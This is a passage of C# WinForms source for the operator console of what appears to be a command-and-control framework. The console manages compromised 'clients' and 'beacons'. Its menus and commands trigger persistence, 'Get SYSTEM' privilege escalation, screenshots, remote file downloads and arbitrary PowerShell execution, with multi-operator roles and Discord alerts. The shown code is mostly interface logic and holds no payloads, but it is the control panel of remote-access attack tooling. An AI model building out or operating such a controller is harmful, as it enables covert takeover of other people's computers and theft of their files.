            LogMessage("", Color.White);


            // Discord Notifications
            LogMessage("┌─── Discord Notifications ────────────────────────────────────────────────────┐", Color.Magenta);
            LogMessage("│                                                                              │", Color.Magenta);
            LogMessage("│  discord_on                                     - Enable notifications       │", Color.White);
            LogMessage("│  discord_off                                    - Disable notifications      │", Color.White);
            LogMessage("│  discord_test                                   - Test notification          │", Color.White);
            LogMessage("│  discord_status                                 - Show Discord status        │", Color.White);
            LogMessage("│  Setup: Create bot a new application and connect it                          │", Color.Magenta);
            LogMessage("└──────────────────────────────────────────────────────────────────────────────┘", Color.Magenta);
            LogMessage("", Color.White);

            // PowerShell Commands
            LogMessage("┌─── PowerShell Commands (Windows) ─────────────────────────────────────────────┐", Color.Blue);
            LogMessage("│                                                                               │", Color.Blue);
            LogMessage("│  powershell <command>               - Execute PowerShell command              │", Color.White);
            LogMessage("│  powershell Get-Process             - Example: List processes                 │", Color.Gray);
            LogMessage("│  powershell Get-ComputerInfo        - Example: System information             │", Color.Gray);
            LogMessage("│  powershell Get-NetAdapter          - Example: Network adapters               │", Color.Gray);
            LogMessage("│                                                                               │", Color.Blue);
            LogMessage("└────────────────────────────────────────────────────────────────────────  ─────┘", Color.Blue);
            LogMessage("", Color.White);


            // Footer instructions
            LogMessage("Type 'connect <id>' to start interacting with a client.", Color.Yellow);
            LogMessage("Use 'list' or 'beacons' to see available clients.", Color.Yellow);
            LogMessage("", Color.White);
            LogMessage("Note: Some commands require direct server access and are not available to operators.", Color.Gray);
            LogMessage("", Color.White);
        }
        private void lvClients_DoubleClick(object sender, EventArgs e)
        {
            try
            {
                // Check if Observer role - prevent connection
                if (_isOperatorConnected && _currentOperatorRole == "Observer")
                {
                    LogMessage("[!] Observer role cannot connect to client sessions", Color.Orange);
                    return;
                }

                if (lvClients.SelectedItems.Count > 0 &&
                    lvClients.SelectedItems[0] != null &&
                    lvClients.SelectedItems[0].Tag != null)
                {
                    string clientId = lvClients.SelectedItems[0].Tag.ToString();
                    if (!string.IsNullOrEmpty(clientId))
                    {
                        ProcessCommand($"connect {clientId}");
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error connecting to client: {ex.Message}", Color.Red);
            }
        }


        private void lvClients_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                if (lvClients.FocusedItem != null && lvClients.FocusedItem.Bounds.Contains(e.Location))
                {
                    contextMenuClient.Show(Cursor.Position);
                }
            }
        }
        private void SetupOperatorActivityHandling()
        {
            if (_isOperatorConnected && activityPanel != null)
            {
                // Clear existing items
                activityPanel.Controls.Clear();

                // Add initial operator mode message
                string roleEmoji = _currentOperatorRole == "Observer" ? "👁️" : "⚡";
                AddActivityItem($"{roleEmoji} {_currentOperatorRole} mode activated: {_operatorUsername}",
                               _currentOperatorRole == "Observer" ? Color.Orange : Color.Green);

                // Start the cleanup timer if not already running
                if (activityCleanupTimer != null && !activityCleanupTimer.Enabled)
                {
                    activityCleanupTimer.Start();
                }
            }
        }


        private void connectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                // Check if Observer role - prevent connection
                if (_isOperatorConnected && _currentOperatorRole == "Observer")
                {
                    LogMessage("[!] Observer role cannot connect to client sessions", Color.Orange);
                    return;
                }

                if (lvClients.SelectedItems.Count > 0 &&
                    lvClients.SelectedItems[0] != null &&
                    lvClients.SelectedItems[0].Tag != null)
                {
                    string clientId = lvClients.SelectedItems[0].Tag.ToString();
                    if (!string.IsNullOrEmpty(clientId))
                    {
                        ProcessCommand($"connect {clientId}");
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error connecting to client: {ex.Message}", Color.Red);
            }
        }



        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessCommand("disconnect");
        }
        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // DISABLED FOR OPERATORS
            if (_isOperatorConnected)
            {
                LogMessage("[!] Kill function is disabled for operators", Color.Red);
                return;
            }

            try
            {
                if (lvClients.SelectedItems.Count > 0 &&
                    lvClients.SelectedItems[0] != null &&
                    lvClients.SelectedItems[0].Tag != null)
                {
                    string clientId = lvClients.SelectedItems[0].Tag.ToString();
                    if (!string.IsNullOrEmpty(clientId))
                    {
                        // Confirm before killing client
                        DialogResult result = MessageBox.Show(
                            $"Are you sure you want to terminate client {clientId}?",
                            "Confirm Kill",
                            MessageBoxButtons.YesNo,
                            MessageBoxIcon.Warning);

                        if (result == DialogResult.Yes)
                        {
                            ProcessCommand($"kill {clientId}");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error killing client: {ex.Message}", Color.Red);
            }
        }


        private void InitializeContextMenu()
        {
            ToolStripMenuItem getsystemToolStripMenuItem = new ToolStripMenuItem();
            getsystemToolStripMenuItem.Name = "getsystemToolStripMenuItem";
            getsystemToolStripMenuItem.Size = new System.Drawing.Size(136, 22);
            getsystemToolStripMenuItem.Text = "Get SYSTEM";
            getsystemToolStripMenuItem.Click += new System.EventHandler(this.getsystemToolStripMenuItem_Click);


            int persistIndex = contextMenuClient.Items.IndexOf(persistToolStripMenuItem);
            if (persistIndex >= 0 && persistIndex + 1 < contextMenuClient.Items.Count)
            {
                contextMenuClient.Items.Insert(persistIndex + 1, getsystemToolStripMenuItem);
            }
            else
            {
                // Fallback: add at the end
                contextMenuClient.Items.Add(getsystemToolStripMenuItem);
            }
        }
        private void screenshotToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ProcessCommand("screenshot");

        }


        private void persistToolStripMenuItem_Click(object sender, EventArgs e)
        {
            // DISABLED FOR OPERATORS
            if (_isOperatorConnected)
            {
                LogMessage("[!] Persistence function is disabled for operators", Color.Red);
                return;
            }

            ProcessCommand("persist");
        }

        private void UpdateContextMenuWithFileExplorer()
        {
            // File Explorer menu item
            ToolStripMenuItem fileExplorerToolStripMenuItem = new ToolStripMenuItem();
            fileExplorerToolStripMenuItem.Name = "fileExplorerToolStripMenuItem";
            fileExplorerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
            fileExplorerToolStripMenuItem.Click += new System.EventHandler(this.fileExplorerToolStripMenuItem_Click);

            // Different text based on mode
            if (_isOperatorConnected)
            {
                if (_currentOperatorRole == "Observer")
                {
                    fileExplorerToolStripMenuItem.Text = "🗂️ File Browser (Observer - Disabled)";
                    fileExplorerToolStripMenuItem.Enabled = false;
                    fileExplorerToolStripMenuItem.ForeColor = Color.Gray;
                }
                else
                {
                    fileExplorerToolStripMenuItem.Text = "🗂️ File Browser (Text Mode)";
                    fileExplorerToolStripMenuItem.Enabled = true;
                    fileExplorerToolStripMenuItem.BackColor = Color.FromArgb(45, 45, 48);
                    fileExplorerToolStripMenuItem.ForeColor = Color.FromArgb(220, 220, 220);
                }
            }
            else
            {
                fileExplorerToolStripMenuItem.Text = "🗂️ File Explorer (GUI)";
                fileExplorerToolStripMenuItem.Enabled = true;
                fileExplorerToolStripMenuItem.BackColor = Color.FromArgb(45, 45, 48);
                fileExplorerToolStripMenuItem.ForeColor = Color.FromArgb(220, 220, 220);
            }

            int separatorIndex = contextMenuClient.Items.IndexOf(toolStripSeparator1);
            if (separatorIndex >= 0)
            {
                contextMenuClient.Items.Insert(separatorIndex + 1, fileExplorerToolStripMenuItem);
            }
            else
            {
                contextMenuClient.Items.Add(fileExplorerToolStripMenuItem);
            }
        }
        private void fileExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            try
            {
                if (_isOperatorConnected)
                {
                    // OPERATOR MODE: Handle differently since we don't have direct client access
                    if (string.IsNullOrEmpty(_operatorActiveClientId))
                    {
                        LogMessage("[!] No active client connection. Use 'connect <id>' command first", Color.Red);
                        return;
                    }

                    // Show file explorer instructions without executing commands automatically
                    LogMessage("[*] File Explorer for Operators - Text Mode", Color.Cyan);
                    LogMessage("   • Use 'ls' or 'dir' to list directory contents", Color.Gray);
                    LogMessage("   • Use 'cd <path>' to change directory", Color.Gray);
                    LogMessage("   • Use 'download <file>' to download files", Color.Gray);
                    LogMessage("   • Use 'pwd' to show current directory", Color.Gray);
                    LogMessage($"[*] Connected to client: {_operatorActiveClientId}", Color.Green);
                    LogMessage("[*] Type commands in the command box below to browse files", Color.Yellow);

                    // Focus on the command input
                    if (txtCommand != null && txtCommand.Enabled)
                    {
                        txtCommand.Focus();
                        txtCommand.Text = "pwd"; // Pre-fill with pwd command
                        txtCommand.SelectAll();
                    }

                    return;
                }

                ClientHandler selectedClient = GetSelectedOrActiveClient();

                if (selectedClient == null)
                {
                    LogMessage("[!] No client available. Please ensure at least one client is connected.", Color.Red);
                    return;
                }

                if (!selectedClient.IsConnected)
                {
                    LogMessage($"[!] Client {selectedClient.ClientId} is not connected", Color.Red);
                    return;
                }

                // Check if file explorer is already open for this client
                if (IsFileExplorerAlreadyOpen(selectedClient.ClientId))
                {
                    LogMessage($"[*] File Explorer is already open for client {selectedClient.ClientId}", Color.Yellow);
                    return;
                }

                LogMessage($"[*] Opening File Explorer for client {selectedClient.ClientId}...", Color.Green);

                var fileExplorer = new EnhancedFileExplorer(selectedClient, this, _server);

                // Register this file explorer to prevent duplicates
                RegisterFileExplorer(selectedClient.ClientId);

                fileExplorer.FormClosing += (s, args) => UnregisterFileExplorer(selectedClient.ClientId);

                fileExplorer.Show();

                LogMessage($"[*] Enhanced File Explorer opened for {selectedClient.ClientId}", Color.Green);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error opening file explorer: {ex.Message}", Color.Red);
            }
        }

        private ClientHandler GetSelectedOrActiveClient()
        {
            ClientHandler selectedClient = null;

            if (lvClients.SelectedItems.Count > 0 && lvClients.SelectedItems[0].Tag != null)
            {
                string selectedClientId = lvClients.SelectedItems[0].Tag.ToString();
                selectedClient = _server.GetClients().FirstOrDefault(c => c.ClientId == selectedClientId);

                if (selectedClient != null && selectedClient.IsConnected)
                {
                    LogMessage($"[*] Using selected client: {selectedClient.ClientId}", Color.Cyan);
                    return selectedClient;
                }
            }

            if (!string.IsNullOrEmpty(_server.ActiveClientId))
            {
                selectedClient = _server.GetClients().FirstOrDefault(c => c.ClientId == _server.ActiveClientId);

                if (selectedClient != null && selectedClient.IsConnected)
                {
                    LogMessage($"[*] Using active client: {selectedClient.ClientId}", Color.Cyan);
                    return selectedClient;
                }
            }

            selectedClient = _server.GetClients().FirstOrDefault(c => c.IsConnected);

            if (selectedClient != null)
            {
                LogMessage($"[*] Using first available client: {selectedClient.ClientId}", Color.Cyan);
                return selectedClient;
            }

            return null; // No clients available
        }

        private static readonly HashSet<string> _openFileExplorers = new HashSet<string>();

        private bool IsFileExplorerAlreadyOpen(string clientId)
        {
            return _openFileExplorers.Contains(clientId);
        }

        private void RegisterFileExplorer(string clientId)
        {
            _openFileExplorers.Add(clientId);
        }

        private void UnregisterFileExplorer(string clientId)
        {
            _openFileExplorers.Remove(clientId);
        }



        private void lvClients_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            try
            {
                if (e.IsSelected && e.Item?.Tag != null)
                {
                    string selectedClientId = e.Item.Tag.ToString();
                    var client = _server.GetClients().FirstOrDefault(c => c.ClientId == selectedClientId);

                    if (client != null)
                    {

                        LogMessage($"[*] Selected client: {selectedClientId} ({client.UserName}@{client.ComputerName})", Color.Gray);
                    }
                }
            }
            catch (Exception ex)
            {
                // Silently handle selection errors
            }
        }

        private void getsystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (_isOperatorConnected)
            {
                LogMessage("[!] Make sure you have the client.exe file inside C2 directory", Color.Red);
                //  return;
            }

            ProcessCommand("getsystem");
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var inputDialog = new InputDialog("Download File", "Enter remote file path to download:"))
            {
                if (inputDialog.ShowDialog() == DialogResult.OK)
                {
                    string filePath = inputDialog.InputValue;

                    // Handle operator vs server mode differently
                    if (_isOperatorConnected)
                    {
                        // For operators, send download command to server
                        ProcessCommand($"download {filePath}");
                        LogMessage($"[*] Download request sent to server: {filePath}", Color.Green);
                    }
                    else
                    {
                        // Local server mode - existing functionality
                        ProcessCommand($"download {filePath}");
                    }
                }
            }
        }
        private void LoadOperatorProfiles()
        {
            try
            {
                // Clear existing items
                cmbOperatorProfiles.Items.Clear();

                // Load fresh profiles from file
                var profiles = OperatorProfileManager.LoadProfiles();

                // LogMessage($"[DEBUG] Loaded {profiles.Count} profiles from file", Color.Gray);

                if (profiles.Count > 0)
                {
                    // Remember current selection if any
                    string previousSelection = null;
                    if (cmbOperatorProfiles.SelectedItem is OperatorProfile previousProfile)
                    {
                        previousSelection = previousProfile.ProfileName;
                    }

                    // Add all profiles to dropdown
                    foreach (var profile in profiles)
                    {
                        cmbOperatorProfiles.Items.Add(profile);
                    }

                    // Try to restore previous selection, or use default, or use first item
                    OperatorProfile toSelect = null;

                    if (!string.IsNullOrEmpty(previousSelection))
                    {
                        // Try to restore previous selection
                        toSelect = profiles.FirstOrDefault(p => p.ProfileName == previousSelection);
                    }

                    if (toSelect == null)
                    {
                        // Use default profile
                        toSelect = OperatorProfileManager.GetDefaultProfile();
                    }

                    if (toSelect == null && profiles.Any())
                    {
                        // Use first profile
                        toSelect = profiles.First();
                    }

                    // Set the selection
                    if (toSelect != null)
                    {
                        for (int i = 0; i < cmbOperatorProfiles.Items.Count; i++)
                        {
                            if (cmbOperatorProfiles.Items[i] is OperatorProfile prof &&
                                prof.ProfileName == toSelect.ProfileName)
                            {
                                cmbOperatorProfiles.SelectedIndex = i;
                                break;
                            }
                        }
                    }

                    _profilesLoaded = true;
                }
                else
                {
                }

                // Update UI controls
                UpdateProfileControls();
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error loading operator profiles: {ex.Message}", Color.Red);
            }
        }

        public void RefreshOperatorProfiles()
        {
            if (InvokeRequired)
            {
                Invoke(new Action(RefreshOperatorProfiles));
                return;
            }

            LoadOperatorProfiles();
        }



        private void UpdateProfileControls()
        {
            bool hasProfiles = OperatorProfileManager.HasProfiles();

            if (hasProfiles)
            {
                cmbOperatorProfiles.Visible = true;
                btnConnectOperator.Text = _isOperatorConnected ? "Disconnect" : "Connect";
                btnConnectOperator.Enabled = true;

                if (_isOperatorConnected)
                {
                    StyleButton(btnConnectOperator, Color.FromArgb(220, 53, 69)); // Red for disconnect
                }
                else
                {
                    StyleButton(btnConnectOperator, Color.FromArgb(40, 167, 69)); // Green for connect
                }
            }
            else
            {
                cmbOperatorProfiles.Visible = false;
                btnConnectOperator.Text = "Connect as Operator";
                btnConnectOperator.Enabled = _multiplayerEnabled;

                if (_multiplayerEnabled)
                {
                    StyleButton(btnConnectOperator, Color.FromArgb(120, 0, 215)); // Purple
                }
                else
                {
                    StyleButton(btnConnectOperator, Color.FromArgb(108, 117, 125)); // Gray
                }
            }

            btnManageProfiles.Enabled = _multiplayerEnabled;
        }




        private void SetupOperatorListView()
        {
            // Create operator list view (similar to client list)
            lvOperators = new ListView
            {
                // Remove fixed location - will be positioned dynamically
                Size = new Size(1200, 100),
                View = View.Details,
                FullRowSelect = true,
                GridLines = true,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                Visible = false // Hidden by default
            };

            // Add columns
            lvOperators.Columns.Add("Username", 120);
            lvOperators.Columns.Add("Role", 80);
            lvOperators.Columns.Add("Connected", 120);
            lvOperators.Columns.Add("Active Client", 120);
            lvOperators.Columns.Add("Remote IP", 150);

        }

        private void LoadMultiplayerSettings()
        {
            try
            {
                var config = OperatorConfigManager.LoadConfig();
                _multiplayerEnabled = config.MultiplayerEnabled;

                // Load operator profiles
                LoadOperatorProfiles();

                UpdateMultiplayerUI();

                // Log initial multiplayer state
                LogMessage($"[*] Multiplayer mode: {(_multiplayerEnabled ? "Enabled" : "Disabled")}", Color.Cyan);
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error loading multiplayer settings: {ex.Message}", Color.Red);
                // Default to disabled if there's an error
                _multiplayerEnabled = false;
                UpdateMultiplayerUI();
            }
        }
        private void BtnToggleMultiplayer_Click(object sender, EventArgs e)
        {
            try
            {
                _multiplayerEnabled = !_multiplayerEnabled;
                OperatorConfigManager.ToggleMultiplayer(_multiplayerEnabled);

                if (_multiplayerEnabled)
                {
                    // If server is already running, start operator server now
                    if (_server != null && _isServerRunning)
                    {
                        LogMessage("[*] Starting operator server...", Color.Cyan);
                        _server.InitializeOperatorServer();
                        _server.StartOperatorServer();
                    }
                    else
                    {
                        LogMessage("[*] Multiplayer enabled - operator server will start when main server starts", Color.Yellow);
                    }
                    LogMessage("[+] Multiplayer enabled", Color.Green);
                }
                else
                {
                    // If server is running, stop operator server
                    if (_server != null && _isServerRunning)
                    {
                        LogMessage("[*] Stopping operator server...", Color.Cyan);
                        _server.StopOperatorServer();
                    }
                    LogMessage("[*] Multiplayer disabled", Color.Yellow);
                }

                UpdateMultiplayerUI();
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error toggling multiplayer: {ex.Message}", Color.Red);
            }
        }

        private void UpdateMultiplayerUI()
        {
            if (_multiplayerEnabled)
            {
                btnToggleMultiplayer.Text = "Disable Multiplayer";
                StyleButton(btnToggleMultiplayer, Color.FromArgb(40, 167, 69)); // Green for enabled
                btnManageProfiles.Enabled = true;

                if (btnManageUsers != null)
                {
                    btnManageUsers.Visible = !_isOperatorConnected; // Hide if connected as operator
                    btnManageUsers.Enabled = !_isOperatorConnected; // Disable if connected as operator
                }

                if (_isServerRunning)
                {
                    lvOperators.Visible = true;
                    lvOperators.Dock = DockStyle.Bottom;
                    lvOperators.Height = 100;
                    splitContainer1.Panel1.Controls.Add(lvOperators);
                }
                else
                {
                    lvOperators.Visible = false;
                    if (splitContainer1.Panel1.Controls.Contains(lvOperators))
                    {
                        splitContainer1.Panel1.Controls.Remove(lvOperators);
                    }
                }

                if (!_isServerRunning)
                {
                    UpdateProfileControls();
                    cmbOperatorProfiles.Visible = OperatorProfileManager.HasProfiles();
                    btnConnectOperator.Visible = true;
                    btnManageProfiles.Visible = true;
                }
                else
                {
                    cmbOperatorProfiles.Visible = false;
                    btnConnectOperator.Visible = false;
                    btnManageProfiles.Visible = false;
                }
            }
            else
            {
                btnToggleMultiplayer.Text = "Enable Multiplayer";
                StyleButton(btnToggleMultiplayer, Color.FromArgb(220, 53, 69)); // Red for disabled
                btnManageProfiles.Enabled = false;
                lvOperators.Visible = false;

                // HIDE "Manage Users" button when multiplayer is disabled
                if (btnManageUsers != null)
                {
                    btnManageUsers.Visible = false;
                    btnManageUsers.Enabled = false;
                }

                if (splitContainer1.Panel1.Controls.Contains(lvOperators))
                {
                    splitContainer1.Panel1.Controls.Remove(lvOperators);
                }

                cmbOperatorProfiles.Visible = false;
                btnConnectOperator.Visible = false;
                btnManageProfiles.Visible = false;

                if (_isOperatorConnected)
                {
                    DisconnectFromOperatorServer();
                }
            }
        }


        private void BtnConnectOperator_Click(object sender, EventArgs e)
        {
            if (!_isOperatorConnected)
            {
                // Check if we have profiles and one is selected
                if (OperatorProfileManager.HasProfiles() &&
                    cmbOperatorProfiles.SelectedItem is OperatorProfile selectedProfile)
                {

                    // Connect using selected profile
                    Task.Run(async () =>
                    {
                        try
                        {
                            await ConnectUsingProfile(selectedProfile);
                        }
                        catch (Exception ex)
                        {
                            this.Invoke(new Action(() =>
                            {
                                LogMessage($"[!] Connection error: {ex.Message}", Color.Red);
                            }));
                        }
                    });
                }
                else
                {
                    // Show manual connection dialog
                    ShowOperatorConnectionDialog();
                }
            }
            else
            {
                DisconnectFromOperatorServer();
            }
        }


        private async Task ConnectUsingProfile(OperatorProfile profile)
        {
            try
            {
                string password = OperatorProfileManager.DecryptPassword(profile.EncryptedPassword);

                if (string.IsNullOrEmpty(password))
                {
                    LogMessage("[!] Failed to decrypt password. Please check the profile.", Color.Red);
                    return;
                }

                LogMessage($"[*] Connecting using profile '{profile.ProfileName}'...", Color.Yellow);

                // Set the profile information for the connection method to use
                _selectedProfile = profile;
                _operatorUsername = profile.Username;

                // Call the parameterless version
                await ConnectToOperatorServer();


            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error connecting with profile: {ex.Message}", Color.Red);
                throw; // Re-throw to handle in retry logic
            }
        }
        private void BtnManageProfiles_Click(object sender, EventArgs e)
        {
            ShowProfileManagementDialog();
        }

        private void ShowProfileManagementDialog()
        {
            Form profileForm = new Form
            {
                Text = "Manage Operator Profiles",
                Size = new Size(700, 500),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false
            };

            // Profile list
            ListView lvProfiles = new ListView
            {
                Location = new Point(20, 20),
                Size = new Size(650, 300),
                View = View.Details,
                FullRowSelect = true,
                GridLines = true,
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220)
            };

            lvProfiles.Columns.Add("Profile Name", 120);
            lvProfiles.Columns.Add("Server", 120);
            lvProfiles.Columns.Add("Port", 60);
            lvProfiles.Columns.Add("Username", 100);
            lvProfiles.Columns.Add("Created", 120);
            lvProfiles.Columns.Add("Last Used", 120);
            lvProfiles.Columns.Add("Default", 60);

            // Load profiles into list
            RefreshProfileList(lvProfiles);

            // Buttons
            Button btnAdd = new Button
            {
                Text = "Add Profile",
                Location = new Point(20, 340),
                Size = new Size(100, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(40, 167, 69),
                ForeColor = Color.White
            };
            btnAdd.Click += (s, e) => ShowAddEditProfileDialog(lvProfiles);

            Button btnEdit = new Button
            {
                Text = "Edit",
                Location = new Point(130, 340),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(255, 193, 7),
                ForeColor = Color.Black
            };
            btnEdit.Click += (s, e) =>
            {
                if (lvProfiles.SelectedItems.Count > 0)
                {
                    var profile = (OperatorProfile)lvProfiles.SelectedItems[0].Tag;
                    ShowAddEditProfileDialog(lvProfiles, profile);
                }
                else
                {
                    MessageBox.Show("Please select a profile to edit.", "No Selection", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            };

            Button btnDelete = new Button
            {
                Text = "Delete",
                Location = new Point(220, 340),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(220, 53, 69),
                ForeColor = Color.White
            };
            btnDelete.Click += (s, e) =>
            {
                if (lvProfiles.SelectedItems.Count > 0)
                {
                    var profile = (OperatorProfile)lvProfiles.SelectedItems[0].Tag;
                    var result = MessageBox.Show($"Are you sure you want to delete profile '{profile.ProfileName}'?",
                        "Confirm Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);

                    if (result == DialogResult.Yes)
                    {
                        OperatorProfileManager.RemoveProfile(profile.ProfileName);
                        RefreshProfileList(lvProfiles);

                        LoadOperatorProfiles();

                        LogMessage($"[*] Profile '{profile.ProfileName}' deleted", Color.Yellow);
                    }
                }
            };

            Button btnSetDefault = new Button
            {
                Text = "Set Default",
                Location = new Point(310, 340),
                Size = new Size(90, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White
            };
            btnSetDefault.Click += (s, e) =>
            {
                if (lvProfiles.SelectedItems.Count > 0)
                {
                    var profile = (OperatorProfile)lvProfiles.SelectedItems[0].Tag;
                    OperatorProfileManager.SetDefaultProfile(profile.ProfileName);
                    RefreshProfileList(lvProfiles);

                    LoadOperatorProfiles();

                    LogMessage($"[*] '{profile.ProfileName}' set as default profile", Color.Green);
                }
            };

            Button btnClose = new Button
            {
                Text = "Close",
                Location = new Point(590, 340),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };
            btnClose.Click += (s, e) => profileForm.Close();

            profileForm.Controls.AddRange(new Control[] {
            lvProfiles, btnAdd, btnEdit, btnDelete, btnSetDefault, btnClose
        });

            profileForm.ShowDialog();
        }


        private void RefreshProfileList(ListView lvProfiles)
        {
            lvProfiles.Items.Clear();

            var profiles = OperatorProfileManager.GetAllProfiles();
            foreach (var profile in profiles)
            {
                var item = new ListViewItem(profile.ProfileName);
                item.SubItems.Add(profile.ServerIP);
                item.SubItems.Add(profile.OperatorPort.ToString());
                item.SubItems.Add(profile.Username);
                item.SubItems.Add(profile.CreatedAt.ToString("yyyy-MM-dd HH:mm"));
                item.SubItems.Add(profile.LastUsed == DateTime.MinValue ? "Never" : profile.LastUsed.ToString("yyyy-MM-dd HH:mm"));
                item.SubItems.Add(profile.IsDefault ? "Yes" : "No");
                item.Tag = profile;

                if (profile.IsDefault)
                {
                    item.BackColor = Color.FromArgb(60, 60, 100); // Highlight default profile
                }

                lvProfiles.Items.Add(item);
            }
        }

        private void ShowAddEditProfileDialog(ListView lvProfiles, OperatorProfile editProfile = null)
        {
            bool isEdit = editProfile != null;

            Form addForm = new Form
            {
                Text = isEdit ? "Edit Profile" : "Add New Profile",
                Size = new Size(400, 320),
                StartPosition = FormStartPosition.CenterParent,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                MaximizeBox = false,
                MinimizeBox = false
            };

            // Profile Name
            Label lblName = new Label { Text = "Profile Name:", Location = new Point(20, 20), AutoSize = true };
            TextBox txtName = new TextBox
            {
                Location = new Point(120, 17),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = editProfile?.ProfileName ?? ""
            };

            // Server IP
            Label lblIP = new Label { Text = "Server IP:", Location = new Point(20, 55), AutoSize = true };
            TextBox txtIP = new TextBox
            {
                Location = new Point(120, 52),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = editProfile?.ServerIP ?? "127.0.0.1"
            };

            // Port
            Label lblPort = new Label { Text = "Port:", Location = new Point(20, 90), AutoSize = true };
            TextBox txtPortProfile = new TextBox
            {
                Location = new Point(120, 87),
                Size = new Size(100, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = editProfile?.OperatorPort.ToString() ?? "9191"
            };

            // Username
            Label lblUser = new Label { Text = "Username:", Location = new Point(20, 125), AutoSize = true };
            TextBox txtUser = new TextBox
            {
                Location = new Point(120, 122),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                Text = editProfile?.Username ?? ""
            };

            // Password
            Label lblPass = new Label { Text = "Password:", Location = new Point(20, 160), AutoSize = true };
            TextBox txtPass = new TextBox
            {
                Location = new Point(120, 157),
                Size = new Size(200, 23),
                BackColor = Color.FromArgb(45, 45, 48),
                ForeColor = Color.FromArgb(220, 220, 220),
                UseSystemPasswordChar = true
            };

            // Default checkbox
            CheckBox chkDefault = new CheckBox
            {
                Text = "Set as default profile",
                Location = new Point(120, 195),
                AutoSize = true,
                ForeColor = Color.FromArgb(220, 220, 220),
                Checked = editProfile?.IsDefault ?? false
            };

            // Save button
            Button btnTestSave = new Button
            {
                Text = isEdit ? "Update" : "Save",
                Location = new Point(120, 230),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(40, 167, 69),
                ForeColor = Color.White
            };

            btnTestSave.Click += (s, e) =>
            {
                try
                {
                    string profileName = txtName.Text.Trim();
                    string serverIP = txtIP.Text.Trim();
                    string username = txtUser.Text.Trim();
                    string password = txtPass.Text;

                    if (string.IsNullOrEmpty(profileName) || string.IsNullOrEmpty(serverIP) ||
                        string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
                    {
                        MessageBox.Show("Please fill in all fields.", "Validation Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }

                    if (!int.TryParse(txtPortProfile.Text, out int port) || port <= 0 || port > 65535)
                    {
                        MessageBox.Show("Please enter a valid port number (1-65535).", "Validation Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Warning);
                        return;
                    }

                    if (isEdit)
                    {
                        OperatorProfileManager.UpdateProfile(profileName, serverIP, port, username, password, chkDefault.Checked);
                        LogMessage($"[*] Profile '{profileName}' updated", Color.Green);
                    }
                    else
                    {
                        OperatorProfileManager.AddProfile(profileName, serverIP, port, username, password, chkDefault.Checked);
                        LogMessage($"[+] Profile '{profileName}' added", Color.Green);
                    }

                    RefreshProfileList(lvProfiles);

                    LoadOperatorProfiles();

                    addForm.Close();
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error saving profile: {ex.Message}", "Error",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            };

            Button btnCancel = new Button
            {
                Text = "Cancel",
                Location = new Point(210, 230),
                Size = new Size(80, 30),
                FlatStyle = FlatStyle.Flat,
                BackColor = Color.FromArgb(108, 117, 125),
                ForeColor = Color.White
            };
            btnCancel.Click += (s, e) => addForm.Close();

            addForm.Controls.AddRange(new Control[] {
            lblName, txtName, lblIP, txtIP, lblPort, txtPortProfile,
            lblUser, txtUser, lblPass, txtPass, chkDefault, btnTestSave, btnCancel
        });

            addForm.ShowDialog();
        }


        private void ShowOperatorConnectionDialog()
        {
            Form connectionForm = new Form
            {
                Text = "Connect to Operator Server",
                Size = new Size(400, 280),
                StartPosition = FormStartPosition.CenterParent,
                BackColor = Color.FromArgb(30, 30, 30),
                ForeColor = Color.FromArgb(220, 220, 220),
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
